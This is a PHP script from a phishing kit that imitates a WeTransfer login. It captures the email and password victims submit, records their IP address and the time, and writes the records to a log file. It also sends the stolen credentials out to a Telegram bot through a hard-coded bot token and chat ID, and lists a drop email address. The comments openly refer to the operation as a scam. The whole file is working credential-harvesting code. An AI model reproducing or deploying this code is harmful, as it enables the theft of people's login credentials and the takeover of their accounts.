<?php

$email = $_POST['email'];
$Password= $_POST['password'];


$date = gmdate ("d-n-Y");
$time = gmdate ("H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];

$tn = 'wongli.kst@gmail.com'; /////////////// PUT YOUR EMAIL HERE \\\\\\\\\\\\\\\\

$telegram = "on";
{
	
$JarJar = "+---------[Wetransfer]----------+
+ Email    : $email
+ Password : $Password
+-----------[ Info ]-----------+
+ Client IP : http://www.geoiptool.com/?IP=$ip
+ Date Log  : $date
+ Time Log  : $time
+---------[Anyi^]----------+";
$file = fopen("logs.txt","a");   //// Save Password in LOGIN.txt / To Change Directory Or Folder Back Add (../) Ex: ../Dir/Scam/LOGIN.txt
fwrite($file,$JarJar);
$subject = "Wetransfer log";
$headers = "From: Anyi-BABA info";
$headers .= "MIME-Version: 1.0\n";
}

$txt = $JarJar;
$chat_id = "531949274"; // Your Telegram Chat ID
$bot_url = "bot1905261133:AAE7ga8QuYmeckS9zM6iuTpHQHD2P2-oYGM"; //Your Telegram Bot Api Key

if ($telegram == "on"){
    $send = ['chat_id'=>$chat_id,'text'=>$txt];
    $website_telegram = "https://api.telegram.org/{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
}
?>
